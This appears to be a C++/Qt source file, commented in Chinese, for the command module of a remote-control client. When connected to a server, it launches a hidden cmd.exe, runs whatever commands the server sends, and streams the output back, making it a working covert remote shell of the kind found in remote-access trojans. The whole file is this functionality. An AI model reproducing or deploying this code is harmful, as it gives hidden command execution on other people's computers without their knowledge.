#include "cmdmanager.h"

CmdManager::CmdManager(TcpClient *TClient, QObject *parent) :AbsManager(TClient)
{
    qDebug() <<"A Cmd Manager is created.";
    connect(m_client,&TcpClient::connected,this,[=](){
        emit logMessage("[CmdManager] 客户端已与服务器连接");
        qDebug()<<"[CmdManager] 客户端已与服务器连接";
        m_client->SendReply(CMD_REPLY);
        StartCmdProcess();
    });
}

CmdManager::~CmdManager()
{
    StopCmdProcess();
}

void CmdManager::HandlePacket(const PACKET &pkt)
{
    qDebug()<<"Command Manager Handling...";
    auto Token = pkt.isToken;
    switch(Token)
    {
    case CMD_INPUT:{
        if (m_outWriteHandle) {
            unsigned long written = 0;
            QString cmdUtf8 = QString::fromUtf8(pkt.payload);
            qDebug()<<"[CmdManager] received:"<<cmdUtf8;
            QByteArray localCmd = cmdUtf8.toLocal8Bit();

            if (!localCmd.isEmpty()) {
                WriteFile(m_outWriteHandle, localCmd.constData(), (DWORD)localCmd.size(), &written, NULL);
            }
            // 换行执行命令
            const char crlf[] = "\r\n";
            WriteFile(m_outWriteHandle, crlf, 2, &written, NULL);

        }
        break;
    }
    default:
        qDebug()<<"unknown istoken:"<<Token;
        break;
    }
}

void CmdManager::StartCmdProcess()
{
    m_inReadHandle = NULL;
    m_inWriteHandle = NULL;
    m_outReadHandle = NULL;
    m_outWriteHandle = NULL;

    SECURITY_ATTRIBUTES  SecurityAttributes = { 0 };            //创建安全属性结构体
    SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);   //管道长度
    SecurityAttributes.lpSecurityDescriptor = NULL;             //安全描述符号，设置为NULL,表示默认描述符
    SecurityAttributes.bInheritHandle = true;                   //表示可被子进程所继承
    //创建管道：写入cmd.exe stdin
    if (!CreatePipe(&m_outReadHandle, &m_outWriteHandle, &SecurityAttributes, 0)) {

        qDebug() << "[CmdManager] CreatePipe stdin failed";
        CloseHandle(m_outReadHandle); CloseHandle(m_outWriteHandle);
        return;
    }

    //确保写端不被继承
    SetHandleInformation(m_outWriteHandle, HANDLE_FLAG_INHERIT, 0);

    //创建管道：cmd.exe stdout/stderr 读取
    if (!CreatePipe(&m_inReadHandle, &m_inWriteHandle, &SecurityAttributes, 0)) {
        qDebug() << "[CmdManager] CreatePipe stdout failed";
        CloseHandle(m_inReadHandle); CloseHandle(m_inWriteHandle);
        return;
    }
    //确保读端不被继承
    SetHandleInformation(m_inReadHandle, HANDLE_FLAG_INHERIT, 0);

    ZeroMemory(&m_startupInfo, sizeof(m_startupInfo));
    m_startupInfo.cb = sizeof(m_startupInfo);
    m_startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    //cmd进程的输入的数据
    m_startupInfo.hStdInput = m_outReadHandle;                           //将管道数据向Cmd赋值
    m_startupInfo.hStdOutput = m_startupInfo.hStdError = m_inWriteHandle;
    //窗口隐藏
    m_startupInfo.wShowWindow = SW_HIDE;

    ZeroMemory(&m_processInfo, sizeof(m_processInfo));

    char  CmdFullPath[MAX_PATH] = { 0 };
    GetSystemDirectoryA(CmdFullPath, MAX_PATH);
    //C:\windows\system32\cmd.exe
    strcat_s(CmdFullPath, MAX_PATH, "\\cmd.exe");

    bool start = CreateProcessA(CmdFullPath, NULL, NULL, NULL, TRUE,
    NORMAL_PRIORITY_CLASS, NULL, NULL, &m_startupInfo, &m_processInfo);
    if(!start)
    {
        qDebug() << "[CmdManager] CreateProcessA failed, err=" << GetLastError();
        // 释放已创建的句柄
        StopCmdProcess();
        return;
    }
    m_isLoop = TRUE;
    m_threadHandle = CreateThread(NULL, 0, ReceiveProcedure, this, 0, NULL);
    if (!m_threadHandle) {
        qDebug() << "[CmdManager] CreateThread failed";
        // 但进程可能已启动，继续保留
    } else {
        qDebug() << "[CmdManager] started read thread";
    }


}

void CmdManager::StopCmdProcess()
{
    m_isLoop = false;
    if (m_threadHandle) {
        // 等待线程退出
        WaitForSingleObject(m_threadHandle, 2000);
        CloseHandle(m_threadHandle);
        m_threadHandle = NULL;
    }
    // 结束子进程
    if (m_processInfo.hProcess) {
        // 尝试优雅结束
        TerminateProcess(m_processInfo.hProcess, 0);
        CloseHandle(m_processInfo.hProcess);
        CloseHandle(m_processInfo.hThread);
        m_processInfo.hProcess = NULL;
        m_processInfo.hThread = NULL;
    }

    if (m_outReadHandle) { CloseHandle(m_outReadHandle); m_outReadHandle = NULL; }
    if (m_outWriteHandle) { CloseHandle(m_outWriteHandle); m_outWriteHandle = NULL; }
    if (m_inReadHandle) { CloseHandle(m_inReadHandle); m_inReadHandle = NULL; }
    if (m_inWriteHandle) { CloseHandle(m_inWriteHandle); m_inWriteHandle = NULL; }

}

void CmdManager::ForwardMessage(const QByteArray &command)
{
    // 所有数据都先转成UTF-8字节流
    QByteArray utf8Data = QString::fromLocal8Bit(command).toUtf8();

    const int maxPayload = PACKET_LENGTH - 9; // 分包发送
    int offset = 0;

    while (offset < utf8Data.size()) {
        int chunkSize = qMin(maxPayload, utf8Data.size() - offset);

        // 确保utf-8字符不被截断
        int end = offset + chunkSize;
        while (end < utf8Data.size() && (utf8Data[end] & 0xC0) == 0x80) {
            end--;
        }
        if (end <= offset) {
            end = offset + chunkSize;
        }

        QByteArray chunk = utf8Data.mid(offset, end - offset);

        PACKET pkt;
        pkt.payload = chunk;
        pkt.isToken = CMD_OUTPUT;
        qDebug()<<"[cmdmanager] send size:"<<pkt.payload.size();
        QMetaObject::invokeMethod(m_client, [this, pkt]() mutable {
                m_client->SendData(pkt);
            }, Qt::QueuedConnection);

        offset = end;
    }

}



DWORD CmdManager::ReceiveProcedure(LPVOID ParameterData)
{
    CmdManager* self = reinterpret_cast<CmdManager*>(ParameterData);
    if (!self) return 0;

    BYTE buffer[4096] = {0};
    DWORD bytesRead = 0;
    DWORD bytesAvailable = 0;

    QByteArray localBuffer;
    auto lastDataTime = GetTickCount(); // 最后一次收到数据的时间
    const DWORD flushInterval = 10;     // 缓冲时间，单位 ms

    while (self->m_isLoop) {
        // 先检查有没有数据
        if (PeekNamedPipe(self->m_inReadHandle, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) {
            // 有数据才读
            BOOL ok = ReadFile(self->m_inReadHandle, buffer, sizeof(buffer), &bytesRead, NULL);
            if (ok && bytesRead > 0) {
                localBuffer.append((const char*)buffer, bytesRead);
                lastDataTime = GetTickCount();
            }
        } else {
            // 没数据，稍微等一下
            Sleep(5);
        }

        // 判断是否超时需要 flush
        if (!localBuffer.isEmpty() && (GetTickCount() - lastDataTime > flushInterval)) {
            self->ForwardMessage(localBuffer);
            localBuffer.clear();
        }
    }

    // 循环结束时，发送剩余数据
    if (!localBuffer.isEmpty()) {
        self->ForwardMessage(localBuffer);
    }

    return 0;
}
